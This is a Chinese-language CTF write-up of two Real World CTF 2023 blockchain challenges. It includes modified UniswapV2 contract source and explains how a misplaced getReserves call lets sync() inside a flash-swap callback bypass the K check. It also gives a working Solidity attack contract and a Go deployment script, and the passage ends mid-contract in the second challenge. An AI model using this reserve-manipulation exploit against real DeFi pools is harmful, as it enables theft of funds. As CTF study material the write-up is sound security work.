# real world ctf 2023 HappyFactory and realwrap

> 原文: https://www.ctfiot.com/90963.html
> ID: 90963

HappyFactory

0x01 Intro

题目的漏洞倒是不难，考察了变版的UniswapV2倒是有一处卡了好久。。。等下分析题目时说一下

0x02 Code

Click to see more

附件合约

/**

*Submitted for verification at Etherscan.io on 2020-05-04

*/

pragma solidity =0.5.16;

interface IKonohaFactory {

event PairCreated(

address indexed token0,

address indexed token1,

address pair,

uint256

);

function feeTo() external view returns (address);

function feeToSetter() external view returns (address);

function getPair(address tokenA, address tokenB)

external

view

returns (address pair);

function allPairs(uint256) external view returns (address pair);

function allPairsLength() external view returns (uint256);

function createPair(address tokenA, address tokenB)

external

returns (address pair);

function setFeeTo(address) external;

function setFeeToSetter(address) external;

}

interface IKonohaPair {

event Approval(

address indexed owner,

address indexed spender,

uint256 value

);

event Transfer(address indexed from, address indexed to, uint256 value);

function name() external pure returns (string memory);

function symbol() external pure returns (string memory);

function decimals() external pure returns (uint8);

function totalSupply() external view returns (uint256);

function balanceOf(address owner) external view returns (uint256);

function allowance(address owner, address spender)

external

view

returns (uint256);

function approve(address spender, uint256 value) external returns (bool);

function transfer(address to, uint256 value) external returns (bool);

function transferFrom(

address from,

address to,

uint256 value

) external returns (bool);

function DOMAIN_SEPARATOR() external view returns (bytes32);

function PERMIT_TYPEHASH() external pure returns (bytes32);

function nonces(address owner) external view returns (uint256);

function permit(

address owner,

address spender,

uint256 value,

uint256 deadline,

uint8 v,

bytes32 r,

bytes32 s

) external;

event Mint(address indexed sender, uint256 amount0, uint256 amount1);

event Burn(

address indexed sender,

uint256 amount0,

uint256 amount1,

address indexed to

);

event Swap(

address indexed sender,

uint256 amount0In,

uint256 amount1In,

uint256 amount0Out,

uint256 amount1Out,

address indexed to

);

event Sync(uint112 reserve0, uint112 reserve1);

function MINIMUM_LIQUIDITY() external pure returns (uint256);

function factory() external view returns (address);

function token0() external view returns (address);

function token1() external view returns (address);

function getReserves()

external

view

returns (

uint112 reserve0,

uint112 reserve1,

uint32 blockTimestampLast

);

function price0CumulativeLast() external view returns (uint256);

function price1CumulativeLast() external view returns (uint256);

function kLast() external view returns (uint256);

function mint(address to) external returns (uint256 liquidity);

function burn(address to)

external

returns (uint256 amount0, uint256 amount1);

function swap(

uint256 amount0Out,

uint256 amount1Out,

address to,

bytes calldata data

) external;

function skim(address to) external;

function sync() external;

function initialize(address, address) external;

}

interface IKonohaERC20 {

event Approval(

address indexed owner,

address indexed spender,

uint256 value

);

event Transfer(address indexed from, address indexed to, uint256 value);

function name() external pure returns (string memory);

function symbol() external pure returns (string memory);

function decimals() external pure returns (uint8);

function totalSupply() external view returns (uint256);

function balanceOf(address owner) external view returns (uint256);

function allowance(address owner, address spender)

external

view

returns (uint256);

function approve(address spender, uint256 value) external returns (bool);

function transfer(address to, uint256 value) external returns (bool);

function transferFrom(

address from,

address to,

uint256 value

) external returns (bool);

function DOMAIN_SEPARATOR() external view returns (bytes32);

function PERMIT_TYPEHASH() external pure returns (bytes32);

function nonces(address owner) external view returns (uint256);

function permit(

address owner,

address spender,

uint256 value,

uint256 deadline,

uint8 v,

bytes32 r,

bytes32 s

) external;

}

interface IERC20 {

event Approval(

address indexed owner,

address indexed spender,

uint256 value

);

event Transfer(address indexed from, address indexed to, uint256 value);

function name() external view returns (string memory);

function symbol() external view returns (string memory);

function decimals() external view returns (uint8);

function totalSupply() external view returns (uint256);

function balanceOf(address owner) external view returns (uint256);

function allowance(address owner, address spender)

external

view

returns (uint256);

function approve(address spender, uint256 value) external returns (bool);

function transfer(address to, uint256 value) external returns (bool);

function transferFrom(

address from,

address to,

uint256 value

) external returns (bool);

}

interface IKonohaCallee {

function KonohaCall(

address sender,

uint256 amount0,

uint256 amount1,

bytes calldata data

) external;

}

contract KonohaERC20 is IKonohaERC20 {

using SafeMath for uint256;

string public constant name = “Konoha Liquidity”;

string public constant symbol = “Konoha”;

uint8 public constant decimals = 18;

uint256 public totalSupply;

mapping(address => uint256) public balanceOf;

mapping(address => mapping(address => uint256)) public allowance;

bytes32 public DOMAIN_SEPARATOR;

// keccak256(“Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)”);

bytes32 public constant PERMIT_TYPEHASH =

0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9;

mapping(address => uint256) public nonces;

event Approval(

address indexed owner,

address indexed spender,

uint256 value

);

event Transfer(address indexed from, address indexed to, uint256 value);

constructor() public {

uint256 chainId;

assembly {

chainId := chainid

}

DOMAIN_SEPARATOR = keccak256(

abi.encode(

keccak256(

“EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)”

),

keccak256(bytes(name)),

keccak256(bytes(“1”)),

chainId,

address(this)

)

);

}

function _mint(address to, uint256 value) internal {

totalSupply = totalSupply.add(value);

balanceOf[to] = balanceOf[to].add(value);

emit Transfer(address(0), to, value);

}

function _burn(address from, uint256 value) internal {

balanceOf[from] = balanceOf[from].sub(value);

totalSupply = totalSupply.sub(value);

emit Transfer(from, address(0), value);

}

function _approve(

address owner,

address spender,

uint256 value

) private {

allowance[owner][spender] = value;

emit Approval(owner, spender, value);

}

function _transfer(

address from,

address to,

uint256 value

) private {

balanceOf[from] = balanceOf[from].sub(value);

balanceOf[to] = balanceOf[to].add(value);

emit Transfer(from, to, value);

}

function approve(address spender, uint256 value) external returns (bool) {

_approve(msg.sender, spender, value);

return true;

}

function transfer(address to, uint256 value) external returns (bool) {

_transfer(msg.sender, to, value);

return true;

}

function transferFrom(

address from,

address to,

uint256 value

) external returns (bool) {

if (allowance[from][msg.sender] != uint256(-1)) {

allowance[from][msg.sender] = allowance[from][msg.sender].sub(

value

);

}

_transfer(from, to, value);

return true;

}

function permit(

address owner,

address spender,

uint256 value,

uint256 deadline,

uint8 v,

bytes32 r,

bytes32 s

) external {

require(deadline >= block.timestamp, “Konoha: EXPIRED”);

bytes32 digest = keccak256(

abi.encodePacked(

“\x19\x01”,

DOMAIN_SEPARATOR,

keccak256(

abi.encode(

PERMIT_TYPEHASH,

owner,

spender,

value,

nonces[owner]++,

deadline

)

)

)

);

address recoveredAddress = ecrecover(digest, v, r, s);

require(

recoveredAddress != address(0) && recoveredAddress == owner,

“Konoha: INVALID_SIGNATURE”

);

_approve(owner, spender, value);

}

}

contract KonohaPair is IKonohaPair, KonohaERC20 {

using SafeMath for uint256;

using UQ112x112 for uint224;

uint256 public constant MINIMUM_LIQUIDITY = 10**3;

bytes4 private constant SELECTOR =

bytes4(keccak256(bytes(“transfer(address,uint256)”)));

address public factory;

address public token0;

address public token1;

uint112 public reserve0; // uses single storage slot, accessible via getReserves

uint112 public reserve1; // uses single storage slot, accessible via getReserves

uint32 public blockTimestampLast; // uses single storage slot, accessible via getReserves

uint256 public price0CumulativeLast;

uint256 public price1CumulativeLast;

uint256 public kLast; // reserve0 * reserve1, as of immediately after the most recent liquidity event

uint256 private unlocked = 1;

modifier lock() {

require(unlocked == 1, “Konoha: LOCKED”);

unlocked = 0;

_;

unlocked = 1;

}

function getReserves()

public

view

returns (

uint112 _reserve0,

uint112 _reserve1,

uint32 _blockTimestampLast

)

{

_reserve0 = reserve0;

_reserve1 = reserve1;

_blockTimestampLast = blockTimestampLast;

}

function _safeTransfer(

address token,

address to,

uint256 value

) private {

(bool success, bytes memory data) = token.call(

abi.encodeWithSelector(SELECTOR, to, value)

);

require(

success && (data.length == 0 || abi.decode(data, (bool))),

“Konoha: TRANSFER_FAILED”

);

}

event Mint(address indexed sender, uint256 amount0, uint256 amount1);

event Burn(

address indexed sender,

uint256 amount0,

uint256 amount1,

address indexed to

);

event Swap(

address indexed sender,

uint256 amount0In,

uint256 amount1In,

uint256 amount0Out,

uint256 amount1Out,

address indexed to

);

event Sync(uint112 reserve0, uint112 reserve1);

constructor() public {

factory = msg.sender;

}

// called once by the factory at time of deployment

function initialize(address _token0, address _token1) external {

require(msg.sender == factory, “Konoha: FORBIDDEN”); // sufficient check

token0 = _token0;

token1 = _token1;

}

// update reserves and, on the first call per block, price accumulators

function _update(

uint256 balance0,

uint256 balance1,

uint112 _reserve0,

uint112 _reserve1

) private {

require(

balance0 <= uint112(-1) && balance1 <= uint112(-1),

“Konoha: OVERFLOW”

);

uint32 blockTimestamp = uint32(block.timestamp % 2**32);

uint32 timeElapsed = blockTimestamp – blockTimestampLast; // overflow is desired

if (timeElapsed > 0 && _reserve0 != 0 && _reserve1 != 0) {

// * never overflows, and + overflow is desired

price0CumulativeLast +=

uint256(UQ112x112.encode(_reserve1).uqdiv(_reserve0)) *

timeElapsed;

price1CumulativeLast +=

uint256(UQ112x112.encode(_reserve0).uqdiv(_reserve1)) *

timeElapsed;

}

reserve0 = uint112(balance0);

reserve1 = uint112(balance1);

blockTimestampLast = blockTimestamp;

emit Sync(reserve0, reserve1);

}

// if fee is on, mint liquidity equivalent to 1/6th of the growth in sqrt(k)

function _mintFee(uint112 _reserve0, uint112 _reserve1)

private

returns (bool feeOn)

{

address feeTo = IKonohaFactory(factory).feeTo();

feeOn = feeTo != address(0);

uint256 _kLast = kLast; // gas savings

if (feeOn) {

if (_kLast != 0) {

uint256 rootK = Math.sqrt(uint256(_reserve0).mul(_reserve1));

uint256 rootKLast = Math.sqrt(_kLast);

if (rootK > rootKLast) {

uint256 numerator = totalSupply.mul(rootK.sub(rootKLast));

uint256 denominator = rootK.mul(5).add(rootKLast);

uint256 liquidity = numerator / denominator;

if (liquidity > 0) _mint(feeTo, liquidity);

}

}

} else if (_kLast != 0) {

kLast = 0;

}

}

// this low-level function should be called from a contract which performs important safety checks

function mint(address to) external lock returns (uint256 liquidity) {

(uint112 _reserve0, uint112 _reserve1, ) = getReserves(); // gas savings

uint256 balance0 = IERC20(token0).balanceOf(address(this));

uint256 balance1 = IERC20(token1).balanceOf(address(this));

uint256 amount0 = balance0.sub(_reserve0);

uint256 amount1 = balance1.sub(_reserve1);

bool feeOn = _mintFee(_reserve0, _reserve1);

uint256 _totalSupply = totalSupply; // gas savings, must be defined here since totalSupply can update in _mintFee

if (_totalSupply == 0) {

liquidity = Math.sqrt(amount0.mul(amount1)).sub(MINIMUM_LIQUIDITY);

_mint(address(0), MINIMUM_LIQUIDITY); // permanently lock the first MINIMUM_LIQUIDITY tokens

} else {

liquidity = Math.min(

amount0.mul(_totalSupply) / _reserve0,

amount1.mul(_totalSupply) / _reserve1

);

}

require(liquidity > 0, “Konoha: INSUFFICIENT_LIQUIDITY_MINTED”);

_mint(to, liquidity);

_update(balance0, balance1, _reserve0, _reserve1);

if (feeOn) kLast = uint256(reserve0).mul(reserve1); // reserve0 and reserve1 are up-to-date

emit Mint(msg.sender, amount0, amount1);

}

// this low-level function should be called from a contract which performs important safety checks

function burn(address to)

external

lock

returns (uint256 amount0, uint256 amount1)

{

(uint112 _reserve0, uint112 _reserve1, ) = getReserves(); // gas savings

address _token0 = token0; // gas savings

address _token1 = token1; // gas savings

uint256 balance0 = IERC20(_token0).balanceOf(address(this));

uint256 balance1 = IERC20(_token1).balanceOf(address(this));

uint256 liquidity = balanceOf[address(this)];

bool feeOn = _mintFee(_reserve0, _reserve1);

uint256 _totalSupply = totalSupply; // gas savings, must be defined here since totalSupply can update in _mintFee

amount0 = liquidity.mul(balance0) / _totalSupply; // using balances ensures pro-rata distribution

amount1 = liquidity.mul(balance1) / _totalSupply; // using balances ensures pro-rata distribution

require(

amount0 > 0 && amount1 > 0,

“Konoha: INSUFFICIENT_LIQUIDITY_BURNED”

);

_burn(address(this), liquidity);

_safeTransfer(_token0, to, amount0);

_safeTransfer(_token1, to, amount1);

balance0 = IERC20(_token0).balanceOf(address(this));

balance1 = IERC20(_token1).balanceOf(address(this));

_update(balance0, balance1, _reserve0, _reserve1);

if (feeOn) kLast = uint256(reserve0).mul(reserve1); // reserve0 and reserve1 are up-to-date

emit Burn(msg.sender, amount0, amount1, to);

}

// this low-level function should be called from a contract which performs important safety checks

function swap(

uint256 amount0Out,

uint256 amount1Out,

address to,

bytes calldata data

) external lock {

require(

amount0Out > 0 || amount1Out > 0,

“Konoha: INSUFFICIENT_OUTPUT_AMOUNT”

);

uint256 balance0;

uint256 balance1;

{

// scope for _token{0,1}, avoids stack too deep errors

address _token0 = token0;

address _token1 = token1;

require(to != _token0 && to != _token1, “Konoha: INVALID_TO”);

if (amount0Out > 0) _safeTransfer(_token0, to, amount0Out); // optimistically transfer tokens

if (amount1Out > 0) _safeTransfer(_token1, to, amount1Out); // optimistically transfer tokens

if (data.length > 0)

IKonohaCallee(to).KonohaCall(

msg.sender,

amount0Out,

amount1Out,

data

);

balance0 = IERC20(_token0).balanceOf(address(this));

balance1 = IERC20(_token1).balanceOf(address(this));

}

(uint112 _reserve0, uint112 _reserve1, ) = getReserves(); // gas savings

require(

amount0Out < _reserve0 && amount1Out < _reserve1,

“Konoha: INSUFFICIENT_LIQUIDITY”

);

uint256 amount0In = balance0 > _reserve0 – amount0Out

? balance0 – (_reserve0 – amount0Out)

: 0;//1e18

uint256 amount1In = balance1 > _reserve1 – amount1Out

? balance1 – (_reserve1 – amount1Out)

: 0;//0

require(

amount0In > 0 || amount1In > 0,

“Konoha: INSUFFICIENT_INPUT_AMOUNT”

);

{

// scope for reserve{0,1}Adjusted, avoids stack too deep errors

uint256 balance0Adjusted = balance0.mul(1000).sub(

amount0In.mul(25)

);

uint256 balance1Adjusted = balance1.mul(1000).sub(

amount1In.mul(25)

);

require(

balance0Adjusted.mul(balance1Adjusted) >=

uint256(_reserve0).mul(_reserve1).mul(1000**2),

“Konoha: K”

);

}

_update(balance0, balance1, _reserve0, _reserve1);

emit Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to);

}

// force balances to match reserves

function skim(address to) external lock {

address _token0 = token0; // gas savings

address _token1 = token1; // gas savings

_safeTransfer(

_token0,

to,

IERC20(_token0).balanceOf(address(this)).sub(reserve0)

);

_safeTransfer(

_token1,

to,

IERC20(_token1).balanceOf(address(this)).sub(reserve1)

);

}

// force reserves to match balances

function sync() external {

_update(

IERC20(token0).balanceOf(address(this)),

IERC20(token1).balanceOf(address(this)),

reserve0,

reserve1

);

}

}

contract KonohaFactory is IKonohaFactory {

address public feeTo;

address public feeToSetter;

mapping(address => mapping(address => address)) public getPair;

address[] public allPairs;

event PairCreated(

address indexed token0,

address indexed token1,

address pair,

uint256

);

constructor(address _feeToSetter) public {

feeToSetter = _feeToSetter;

}

function allPairsLength() external view returns (uint256) {

return allPairs.length;

}

function createPair(address tokenA, address tokenB)

external

returns (address pair)

{

require(tokenA != tokenB, “Konoha: IDENTICAL_ADDRESSES”);

(address token0, address token1) = tokenA < tokenB

? (tokenA, tokenB)

: (tokenB, tokenA);

require(token0 != address(0), “Konoha: ZERO_ADDRESS”);

require(getPair[token0][token1] == address(0), “Konoha: PAIR_EXISTS”); // single check is sufficient

bytes memory bytecode = type(KonohaPair).creationCode;

bytes32 salt = keccak256(abi.encodePacked(token0, token1));

assembly {

pair := create2(0, add(bytecode, 32), mload(bytecode), salt)

}

IKonohaPair(pair).initialize(token0, token1);

getPair[token0][token1] = pair;

getPair[token1][token0] = pair; // populate mapping in the reverse direction

allPairs.push(pair);

emit PairCreated(token0, token1, pair, allPairs.length);

}

function setFeeTo(address _feeTo) external {

require(msg.sender == feeToSetter, “Konoha: FORBIDDEN”);

feeTo = _feeTo;

}

function setFeeToSetter(address _feeToSetter) external {

require(msg.sender == feeToSetter, “Konoha: FORBIDDEN”);

feeToSetter = _feeToSetter;

}

function test() public view returns (bytes32) {

return

keccak256(

“Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)”

);

}

}

// a library for performing overflow-safe math, courtesy of DappHub (https://github.com/dapphub/ds-math)

library SafeMath {

function add(uint256 x, uint256 y) internal pure returns (uint256 z) {

require((z = x + y) >= x, “ds-math-add-overflow”);

}

function sub(uint256 x, uint256 y) internal pure returns (uint256 z) {

require((z = x – y) <= x, “ds-math-sub-underflow”);

}

function mul(uint256 x, uint256 y) internal pure returns (uint256 z) {

require(y == 0 || (z = x * y) / y == x, “ds-math-mul-overflow”);

}

}

// a library for performing various math operations

library Math {

function min(uint256 x, uint256 y) internal pure returns (uint256 z) {

z = x < y ? x : y;

}

// babylonian method (https://en.wikipedia.org/wiki/Methods_of_computing_square_roots#Babylonian_method)

function sqrt(uint256 y) internal pure returns (uint256 z) {

if (y > 3) {

z = y;

uint256 x = y / 2 + 1;

while (x < z) {

z = x;

x = (y / x + x) / 2;

}

} else if (y != 0) {

z = 1;

}

}

}

// a library for handling binary fixed point numbers (https://en.wikipedia.org/wiki/Q_(number_format))

// range: [0, 2**112 – 1]

// resolution: 1 / 2**112

library UQ112x112 {

uint224 constant Q112 = 2**112;

// encode a uint112 as a UQ112x112

function encode(uint112 y) internal pure returns (uint224 z) {

z = uint224(y) * Q112; // never overflows

}

// divide a UQ112x112 by a uint112, returning a UQ112x112

function uqdiv(uint224 x, uint112 y) internal pure returns (uint224 z) {

z = x / uint224(y);

}

}

Copy

题目合约：

其余部分几乎一样的，就是换成了interface

contract Happy {

event tokenA_tokenB(address, address);

IHappyFactory factory =

IHappyFactory(address(0xA2A21Fe2fD692b63Df06ECd5b0a783323B4eae36));

function setup() public returns (address, address) {

Token tokenA = new Token();

Token tokenB = new Token();

address pair = factory.createPair(address(tokenA), address(tokenB));

tokenA.mint(pair, 10 ether);

tokenB.mint(pair, 10 ether);

IHappyPair(pair).sync();

tokenA.mint(msg.sender, 1 ether);

emit tokenA_tokenB(address(tokenA), address(tokenB));

return (address(tokenA), address(tokenB));

}

}

contract Greeter {

address happy_contract;

address public tokenA;

address public tokenB;

address deployer;

constructor() public {

happy_contract = address(0x2d55bF802F341F969F777F94f7A39604133BE4F6);

(tokenA, tokenB) = Happy(happy_contract).setup();

deployer = msg.sender;

}

function airdrop() public {

IERC20(tokenA).transfer(msg.sender, 1 ether);

}

function isSolved() public view returns (bool) {

return IERC20(tokenB).balanceOf(deployer) >= 1 ether;

}

}

Copy

0x03 Analyse

分析代码看来这道题目就是使用了一个变版的uniswapV2的代码，重点在于swap函数，我们来看一下是哪里出现了问题

正确版本：

function swap(

uint256 amount0Out,

uint256 amount1Out,

address to,

bytes calldata data

) external lock {

require(

amount0Out > 0 || amount1Out > 0,

“UniswapV2: INSUFFICIENT_OUTPUT_AMOUNT”

);

(uint112 _reserve0, uint112 _reserve1, ) = getReserves();

require(

amount0Out < _reserve0 && amount1Out < _reserve1,

“UniswapV2: INSUFFICIENT_LIQUIDITY”

);

uint256 balance0;

uint256 balance1;

{

// scope for _token{0,1}, avoids stack too deep errors

address _token0 = token0;

address _token1 = token1;

require(to != _token0 && to != _token1, “UniswapV2: INVALID_TO”);

if (amount0Out > 0) IERC20(_token0).safeTransfer(to, amount0Out);

if (amount1Out > 0) IERC20(_token1).safeTransfer(to, amount1Out);

if (data.length > 0)

IUniswapV2Callee(to).uniswapV2Call(

msg.sender,

amount0Out,

amount1Out,

data

);

balance0 = IERC20(_token0).balanceOf(address(this));

balance1 = IERC20(_token1).balanceOf(address(this));

}

uint256 amount0In = balance0 > _reserve0 – amount0Out

? balance0 – (_reserve0 – amount0Out)

: 0;

uint256 amount1In = balance1 > _reserve1 – amount1Out

? balance1 – (_reserve1 – amount1Out)

: 0;

require(

amount0In > 0 || amount1In > 0,

“UniswapV2: INSUFFICIENT_INPUT_AMOUNT”

);

{

// scope for reserve{0,1}Adjusted, avoids stack too deep errors

uint256 balance0Adjusted = balance0.mul(1000).sub(amount0In.mul(3));

uint256 balance1Adjusted = balance1.mul(1000).sub(amount1In.mul(3));

require(

balance0Adjusted.mul(balance1Adjusted) >=

uint256(_reserve0).mul(_reserve1).mul(1000 ** 2),

“UniswapV2: K”

);

}

_update(balance0, balance1, _reserve0, _reserve1);

emit Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to);

}

Copy

题目版本：

function swap(

uint256 amount0Out,

uint256 amount1Out,

address to,

bytes calldata data

) external lock {

require(

amount0Out > 0 || amount1Out > 0,

“Konoha: INSUFFICIENT_OUTPUT_AMOUNT”

);

uint256 balance0;

uint256 balance1;

{

// scope for _token{0,1}, avoids stack too deep errors

address _token0 = token0;

address _token1 = token1;

require(to != _token0 && to != _token1, “Konoha: INVALID_TO”);

if (amount0Out > 0) _safeTransfer(_token0, to, amount0Out); // optimistically transfer tokens

if (amount1Out > 0) _safeTransfer(_token1, to, amount1Out); // optimistically transfer tokens

if (data.length > 0)

IKonohaCallee(to).KonohaCall(

msg.sender,

amount0Out,

amount1Out,

data

);

balance0 = IERC20(_token0).balanceOf(address(this));

balance1 = IERC20(_token1).balanceOf(address(this));

}

(uint112 _reserve0, uint112 _reserve1, ) = getReserves(); // gas savings

require(

amount0Out < _reserve0 && amount1Out < _reserve1,

“Konoha: INSUFFICIENT_LIQUIDITY”

);

uint256 amount0In = balance0 > _reserve0 – amount0Out

? balance0 – (_reserve0 – amount0Out)

: 0;//1e18

uint256 amount1In = balance1 > _reserve1 – amount1Out

? balance1 – (_reserve1 – amount1Out)

: 0;//0

require(

amount0In > 0 || amount1In > 0,

“Konoha: INSUFFICIENT_INPUT_AMOUNT”

);

{

// scope for reserve{0,1}Adjusted, avoids stack too deep errors

uint256 balance0Adjusted = balance0.mul(1000).sub(

amount0In.mul(25)

);

uint256 balance1Adjusted = balance1.mul(1000).sub(

amount1In.mul(25)

);

require(

balance0Adjusted.mul(balance1Adjusted) >=

uint256(_reserve0).mul(_reserve1).mul(1000**2),

“Konoha: K”

);

}

_update(balance0, balance1, _reserve0, _reserve1);

emit Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to);

}

Copy

对比之下比较容易发现实际上两段代码的逻辑差异就是调用getreserve()的顺序不一样，正是由于顺序的不同造成了该题目的漏洞函数getreserve0()发生在flashloan之后，这也就意味着我们可以在flashloan过程中通过sync()函数操纵reserve，从而达到绕过K值检测

针对题目数据做一个简单的构造来看一下

题目合约部署之后两个token的reerse都为10，但是我们可以通过airdrop获得一个tokenA，这个A先不用，调用swap函数，tokenAout设置为0，tokenBout设置为1，此时swap函数中执行到外部调用（就是在这里卡了几个小时，题目合约都是interface形式，没有给出外部调用的函数名，甚至还写了个脚本把byteode一位一位的跑了一遍。。最后还是根据KonahaPair合约函数名试出来的），通过攻击合约中的恶意函数，调用sync，更新reserve，同时将我们的一个TokenA转账到pair合约

此时

balanceA：11

reserveA：10

balanceB：9

reserveB：9

amountAIn：1

AmountBIn：1

Copy

经过K值检测之后数值大8左右具体记不清了，这样的话满足了K值检测，用一个ToKenA获得到了一个TokenB，再将获得到的TokenB转账到deploy地址下就可以了

0x04 Attack

contract attack {

Greeter public airdrop;

IHappyPair public target;

IERC20 public TokenA;

IERC20 public TokenB;

constructor()  {

TokenA = IERC20(0x7FB26050C2f2dCB3C5A55040a2a59ba586e15131);

TokenB = IERC20(0xA68Ec5cF94031766CAdF014F4aCdFc74163462bb);

airdrop = Greeter(0xef7C82a5C917BBf442a385ba971905E187cFb56E);

target = IHappyPair(0x6dD412b76987CFCfcBDdb633A36832cdc9B939B5);

airdrop.airdrop();

}

function step()public{

target.swap(0, 1e18, address(this), “0x1234”);

}

function HappyCall(address q,uint w,uint e,bytes calldata data)external{

target.sync();

TokenA.transfer(address(target), TokenA.balanceOf(address(this)));

}

function over(address to)public{

TokenB.transfer(to, 1e18);

}

}

Copy

Pwn.go

chainID, err := client.NetworkID(context.Background())

auth, _ := bind.NewKeyedTransactorWithChainID(privateKey, chainID)

auth.Nonce = big.NewInt(int64(nonce))

auth.Value = big.NewInt(0)      // in wei

auth.GasLimit = uint64(3000000) // in units

auth.GasPrice = gasPrice

//address, tx, _, err := attack.DeployAttack(auth, client)

//

//if err != nil {

//log.Fatal(err)

//}

//

//fmt.Println(address.Hex())

//fmt.Println(tx.Hash().Hex())

//instance, _ := attack.NewAttack(common2.HexToAddress(“0xb9B01490cEE9d1FC84Ba19b55AFeAE7658fA8c6f”), client)

//tx1, _ := instance.Step(auth)

//fmt.Println(tx1.To(), tx1.Hash())

instance, _ := attack.NewAttack(common2.HexToAddress(“0xb9B01490cEE9d1FC84Ba19b55AFeAE7658fA8c6f”), client)

tx1, _ := instance.Over(auth, common2.HexToAddress(“0x4A843418Aa8679D9709A08261d48aC9AE6cEc1c3”))

fmt.Println(tx1.To(), tx1.Hash())

Copy

最终这道题也是拿到了第四解

realwrap

0x01 Intro

这道题目使用go仿照着erc20写了一个程序，实现了使用预编译合约直接将ETH作为WrappedETH使用，还是蛮有新意的。

个人感觉难度比上一道题大一点，但是在比赛中做出这个题目的团队数大概是上一道题目的三倍左右。

0x02 Code

Click to see more

pragma solidity ^0.8.17;

import “@openzeppelin/contracts/token/ERC20/ERC20.sol”;

import “@openzeppelin/contracts/token/ERC20/IERC20.sol”;

import “./UniswapV2Pair.sol”;

contract SimpleToken is ERC20 {

constructor(uint256 _initialSupply) ERC20(“SimpleToken”, “SPT”) {

_mint(msg.sender, _initialSupply);

}

}

interface IUniswapV2Pair {

function getReserves()

external

view

returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);

function mint(address to) external returns (uint liquidity);

function initialize(address, address) external;

}

contract Factory {

address public constant WETH = 0x0000000000000000000000000000000000004eA1;

address public uniswapV2Pair;

event PairCreated(

address indexed token0,

address indexed token1,

address pair

);

constructor() payable {

require(msg.value == 1 ether);

address token = address(new SimpleToken(10 ** 8 * 1 ether));

uniswapV2Pair = createPair(WETH, token);

IERC20(WETH).transfer(uniswapV2Pair, 1 ether);

IERC20(token).transfer(uniswapV2Pair, 100 ether);

IUniswapV2Pair(uniswapV2Pair).mint(msg.sender);

}

function createPair(

address tokenA,

address tokenB

) public returns (address pair) {

(address token0, address token1) = tokenA < tokenB

? (tokenA, tokenB)

: (tokenB, tokenA);

bytes32 salt = keccak256(abi.encodePacked(token0, token1));

pair = address(new UniswapV2Pair{salt: salt}());

IUniswapV2Pair(pair).initialize(token0, token1);

emit PairCreated(token0, token1, pair);

}

function isSolved() public view returns (bool) {

(uint256 reserve0, uint256 reserve1, ) = IUniswapV2Pair(uniswapV2Pair)

.getReserves();

return reserve0 == 0 && reserve1 == 0;

}

}

Copy

Click to see more

pragma solidity ^0.8.17;

import “@openzeppelin/contracts/token/ERC20/ERC20.sol”;

import “@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol”;

import “@openzeppelin/contracts/utils/math/Math.sol”;

import “@openzeppelin/contracts/utils/math/SafeMath.sol”;

import “./libraries/UQ112x112.sol”;

interface IUniswapV2Callee {

function uniswapV2Call(

address sender,

uint256 amount0,

uint256 amount1,

bytes calldata data

) external;

}

contract UniswapV2ERC20 is ERC20 {

constructor() ERC20(“Uniswap V2”, “UNI-V2”) {}

}

contract UniswapV2Pair is UniswapV2ERC20 {

using SafeMath for uint256;

using UQ112x112 for uint224;

using SafeERC20 for IERC20;

uint256 public constant MINIMUM_LIQUIDITY = 10 ** 3;

address public factory;

address public token0;

address public token1;

uint112 private reserve0; // uses single storage slot, accessible via getReserves

uint112 private reserve1; // uses single storage slot, accessible via getReserves

uint32 private blockTimestampLast; // uses single storage slot, accessible via getReserves

uint256 public price0CumulativeLast;

uint256 public price1CumulativeLast;

uint256 private unlocked = 1;

modifier lock() {

require(unlocked == 1, “UniswapV2: LOCKED”);

unlocked = 0;

_;

unlocked = 1;

}

function getReserves()

public

view

returns (

uint112 _reserve0,

uint112 _reserve1,

uint32 _blockTimestampLast

)

{

_reserve0 = reserve0;

_reserve1 = reserve1;

_blockTimestampLast = blockTimestampLast;

}

event Mint(address indexed sender, uint256 amount0, uint256 amount1);

event Burn(

address indexed sender,

uint256 amount0,

uint256 amount1,

address indexed to

);

event Swap(

address indexed sender,

uint256 amount0In,

uint256 amount1In,

uint256 amount0Out,

uint256 amount1Out,

address indexed to

);

event Sync(uint112 reserve0, uint112 reserve1);

constructor() {

factory = msg.sender;

}

// called once by the factory at time of deployment

function initialize(address _token0, address _token1) external {

require(msg.sender == factory, “UniswapV2: FORBIDDEN”); // sufficient check

token0 = _token0;

token1 = _token1;

}

// update reserves and, on the first call per block, price accumulators

function _update(

uint256 balance0,

uint256 balance1,

uint112 _reserve0,

uint112 _reserve1

) private {

require(

balance0 <= type(uint112).max && balance1 <= type(uint112).max,

“UniswapV2: OVERFLOW”

);

uint32 blockTimestamp = uint32(block.timestamp % 2 ** 32);

unchecked {

uint32 timeElapsed = blockTimestamp – blockTimestampLast; // overflow is desired

if (timeElapsed > 0 && _reserve0 != 0 && _reserve1 != 0) {

// * never overflows, and + overflow is desired

price0CumulativeLast +=

uint256(UQ112x112.encode(_reserve1).uqdiv(_reserve0)) *

timeElapsed;

price1CumulativeLast +=

uint256(UQ112x112.encode(_reserve0).uqdiv(_reserve1)) *

timeElapsed;

}

}

reserve0 = uint112(balance0);

reserve1 = uint112(balance1);

blockTimestampLast = blockTimestamp;

emit Sync(reserve0, reserve1);

}

// this low-level function should be called from a contract which performs important safety checks

function mint(address to) external lock returns (uint256 liquidity) {

(uint112 _reserve0, uint112 _reserve1, ) = getReserves();

uint256 balance0 = IERC20(token0).balanceOf(address(this));

uint256 balance1 = IERC20(token1).balanceOf(address(this));

uint256 amount0 = balance0.sub(_reserve0);

uint256 amount1 = balance1.sub(_reserve1);

uint256 _totalSupply = totalSupply();

if (_totalSupply == 0) {

liquidity = Math.sqrt(amount0.mul(amount1)).sub(MINIMUM_LIQUIDITY);

_mint(address(0xdEaD), MINIMUM_LIQUIDITY); // permanently lock the first MINIMUM_LIQUIDITY tokens

} else {

liquidity = Math.min(

amount0.mul(_totalSupply) / _reserve0,

amount1.mul(_totalSupply) / _reserve1

);

}

require(liquidity > 0, “UniswapV2: INSUFFICIENT_LIQUIDITY_MINTED”);

_mint(to, liquidity);

